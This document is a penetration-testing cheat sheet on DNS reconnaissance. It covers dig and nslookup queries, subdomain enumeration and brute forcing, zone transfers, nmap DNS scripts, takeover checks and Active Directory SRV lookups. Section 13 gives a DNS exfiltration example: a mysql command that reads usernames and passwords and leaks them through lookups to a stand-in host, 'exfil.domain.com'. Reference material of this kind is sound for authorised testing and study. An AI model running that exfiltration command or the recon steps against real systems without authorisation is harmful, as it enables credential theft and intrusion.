## DNS Reconnaissance

> **Concept/Goal:**  
> Querying DNS servers to resolve names to IPs, discover services (MX, SRV), identify authoritative servers, enumerate subdomains, check for misconfigs (zone transfers), and map DNS infrastructure. Fundamental for expanding attack surface and understanding target environment.

---

### 1. Key Tools

- **CLI Query Tools:** `dig`, `host`, `nslookup`
- **General Recon:** `whois`
- **Enumeration Frameworks:** `dnsrecon`, `fierce`, `dnsenum`, Metasploit (`auxiliary/gather/enum_dns`)
- **Passive Enumerators:** `amass`, `subfinder`, `assetfinder`, `sublist3r`, `theHarvester`  
  🔗 [See Section X.Y: Subdomain Enumeration (Passive)]
- **Bruteforce Tools:** `gobuster` (dns mode), `ffuf` (vhost fuzzing), Nmap (`dns-brute` script)
- **Permutation Generators:** `dnsgen`, `gotator`
- **Mass Resolvers:** `massdns`
- **Takeover Checkers:** `subjack`, `tko-subs`, `dnsReaper`
- **Network Scanners:** `nmap`
- **Packet Analyzers:** `tcpdump`
- **AD-Specific:** `adidnsdump`

---

### 2. Initial Domain Information

- **Whois Lookup:**  
  ```bash
  whois <target>
  ```
  > Registration details, contact info, nameserver names.

---

### 3. Basic DNS Queries (dig & host)

- **Default A Record:**  
  ```bash
  dig $DOMAIN
  host $DOMAIN
  ```
- **Specific Record Types:**  
  ```bash
  dig $DOMAIN A       # IPv4
  dig $DOMAIN AAAA    # IPv6
  dig $DOMAIN MX      # Mail servers
  dig $DOMAIN NS      # Authoritative NS
  dig $DOMAIN TXT     # SPF, DKIM, DMARC
  dig $DOMAIN CNAME   # Aliases
  dig $DOMAIN SOA     # Zone admin & serial
  dig $DOMAIN ANY     # Often incomplete
  host -a $DOMAIN     # Similar to ANY
  ```
- **Short Output:**  
  ```bash
  dig $DOMAIN +short
  dig MX $DOMAIN +short
  dig NS $DOMAIN +short
  ```
- **Reverse Lookup (PTR):**  
  ```bash
  dig -x $TARGET_IP +short
  host $TARGET_IP
  ```
- **Query Specific Server:**  
  ```bash
  dig @$DNS_SERVER $DOMAIN MX
  dig -x $TARGET_IP @$TARGET_NS
  host $DOMAIN $TARGET_NS
  ```
- **Trace Delegation:**  
  ```bash
  dig +trace $DOMAIN
  ```
- **Filtered Answer Only:**  
  ```bash
  dig +noall +answer $DOMAIN
  ```
- **Bulk from File:**  
  ```bash
  dig -f domains.txt
  ```
- **Compare Resolvers:**  
  ```bash
  for r in 1.1.1.1 8.8.8.8 9.9.9.9; do
    echo "== $r ==";
    dig @$r $DOMAIN A +short;
  done | tee dns_diff.txt
  ```

---

### 4. Basic DNS Queries (nslookup)

- **Default A Record:**  
  ```bash
  nslookup <target>
  ```
- **Specific Types:**  
  ```bash
  nslookup -query=A <target>
  nslookup -query=AAAA <target>
  nslookup -query=MX <target>
  nslookup -query=NS <target>
  nslookup -query=TXT <target>
  nslookup -query=SOA <target>
  nslookup -query=CNAME <target>
  nslookup -query=ANY <target>   # Often incomplete
  ```
- **Reverse PTR:**  
  ```bash
  nslookup -query=PTR <target_ip>
  ```
- **Interactive with Server:**  
  ```bash
  printf "server $DNS_SERVER\nset type=ANY\n$REVERSE_IP\nexit\n" | nslookup
  ```

---

### 5. General Enumeration Tools

- **dnsenum:**  
  ```bash
  dnsenum <target>
  ```
- **Metasploit (enum_dns):**  
  ```bash
  msfconsole -q -x 'use auxiliary/gather/enum_dns;
    set DOMAIN <domain>;
    set WORDLIST <wordlist>;
    run; exit'
  ```

---

### 6. Passive Subdomain Enumeration

- **Certificate Transparency (crt.sh):**  
  ```bash
  curl -s "https://crt.sh/?q=%25.$DOMAIN&output=json" \
    | jq -r '.[].name_value' \
    | sed 's/\*\.//g' \
    | sort -u
  ```
- **Aggregator Tools:**  
  ```bash
  amass enum -d $DOMAIN -passive
  subfinder -d $DOMAIN -all
  assetfinder --subs-only $DOMAIN
  sublist3r -d $DOMAIN
  ```
- **API Queries:**  
  ```bash
  curl -s "https://api.hackertarget.com/hostsearch/?q=$DOMAIN" | cut -d',' -f1
  curl -s "https://rapiddns.io/subdomain/$DOMAIN?full=1" \
    | grep -oP '<td>\K[^<]*' \
    | sort -u
  ```

---

### 7. Active Subdomain Enumeration (Bruteforce)

- **Gobuster DNS Mode:**  
  ```bash
  gobuster dns -d $DOMAIN -w subs.txt -t 50 -o gobuster.txt
  gobuster dns -d $DOMAIN -w subs.txt --resolver 1.1.1.1 --show-ips -t 15 -o gobuster_res.txt
  ```
- **dnsrecon Bruteforce:**  
  ```bash
  dnsrecon -d $DOMAIN -t brt -D subs.txt
  dnsrecon -d $DOMAIN -t axfr -n $DNS_SERVER
  ```
- **fierce:**  
  ```bash
  fierce -dns $DOMAIN --wordlist subs.txt
  ```
- **ffuf VHost Fuzzing:**  
  ```bash
  ffuf -w subs.txt \
    -u http://$WEBSERVER_IP \
    -H "Host: FUZZ.$DOMAIN" \
    -fs <size>
  ```
- **Nmap dns-brute Script:**  
  ```bash
  nmap --script dns-brute \
    --script-args dns-brute.domain=$DOMAIN,\
dns-brute.hostlist=subs.txt \
    $TARGET_NS
  ```

---

### 8. Subdomain Validation & Permutation

- **Validate with host:**  
  ```bash
  host $sub.$DOMAIN | grep "has address"
  ```
- **Resolve & Filter:**  
  ```bash
  for s in $(cat subs.txt); do
    host $s.$DOMAIN \
      | grep "has address" \
      | grep "$DOMAIN";
  done
  ```
- **Generate Permutations (dnsgen + massdns):**  
  ```bash
  dnsgen known.txt | massdns -r resolvers.txt -t A -o S -w permuted.txt
  ```
- **Gotator:**  
  ```bash
  gotator -sub known.txt -perm perms.txt -depth 1 \
    -numbers 10 -mindup -adv -md > potential.txt
  ```

---

### 9. DNS Zone Transfer (AXFR)

- **dig AXFR:**  
  ```bash
  dig axfr @$TARGET_NS $DOMAIN
  ```
- **host AXFR:**  
  ```bash
  host -l $DOMAIN $TARGET_NS
  ```
- **dnsrecon AXFR:**  
  ```bash
  dnsrecon -d $DOMAIN -t axfr
  dnsrecon -d $DOMAIN -t axfr -n $DNS_SERVER
  ```
- **Nmap AXFR Script:**  
  ```bash
  nmap -p 53 --script dns-zone-transfer \
    --script-args dns-zone-transfer.domain=$DOMAIN \
    $TARGET_NS
  ```

---

### 10. DNS Service Scanning (Nmap)

- **Port Scan:**  
  ```bash
  nmap -p 53 -sU -sT $TARGET_NS
  ```
- **Version Scan (UDP):**  
  ```bash
  nmap -p 53 -sU -sV $TARGET_NS
  ```
- **NSID Query:**  
  ```bash
  nmap -p 53 -sU --script dns-nsid $TARGET_NS
  ```

---

### 11. Subdomain Takeover Detection

- **Manual CNAME Check:**  
  ```bash
  host -t CNAME $sub.$DOMAIN
  if host $sub.$DOMAIN | grep -q "s3.amazonaws.com"; then
    echo "Potential S3 takeover on $sub.$DOMAIN";
  fi
  ```
- **Automated Tools:**  
  ```bash
  subjack -w potential.txt -t 100 -timeout 30 -o takeover.txt -ssl
  tko-subs -domains domains.txt
  dnsReaper scan -d $DOMAIN --check-takeover
  ```

---

### 12. Active Directory-Specific DNS

- **LDAP Servers:**  
  ```bash
  dig @$DC_IP SRV _ldap._tcp.dc._msdcs.$DOMAIN
  ```
- **Kerberos Servers:**  
  ```bash
  dig @$DC_IP SRV _kerberos._tcp.dc._msdcs.$DOMAIN
  dig @$DC_IP SRV _kerberos._udp.$DOMAIN
  ```
- **Global Catalog:**  
  ```bash
  dig @$DC_IP SRV _gc._tcp.dc._msdcs.$DOMAIN
  ```
- **Password Change:**  
  ```bash
  dig @$DC_IP SRV _kpasswd._tcp.$DOMAIN
  dig @$DC_IP SRV _kpasswd._udp.$DOMAIN
  ```
- **Dump AD-Integrated Zone:**  
  ```bash
  adidnsdump -u '$DOMAIN\$USER' -p '$PASSWORD' $DC_IP
  ```

---

### 13. DNS Traffic Monitoring & Exfiltration

- **Capture Queries:**  
  ```bash
  tcpdump -i any port 53 -l -A
  tcpdump -ln -i tun0 port 53 -A 2>/dev/null \
    | grep -E -o "([0-9A-Za-z][0-9A-Za-z\-]*\.)+[0-9A-Za-z][0-9A-Za-z\-]*"
  ```
- **DNS Exfil Example:**  
  ```bash
  mysql -h $TARGET_DB -u root -p'$PASSWORD' \
    -e "SELECT CONCAT(username, '.', password, '.exfil.domain.com') FROM users;" \
    | grep -v username | xargs -I{} ping -c 1 {}
  ```

---

### 14. Combined Workflows

- **Subfinder → Nuclei:**  
  ```bash
  subfinder -d $DOMAIN -all -silent \
    | httpx -silent \
    | nuclei -t exposures/ -o nuclei_exposures.txt
  ```
- **Multi-Record Enum:**  
  ```bash
  for d in $(cat domains.txt); do
    (dig +short A $d @$NS; dig +short AAAA $d @$NS) \
    | sort -u > $d-records.txt;
  done
  ```
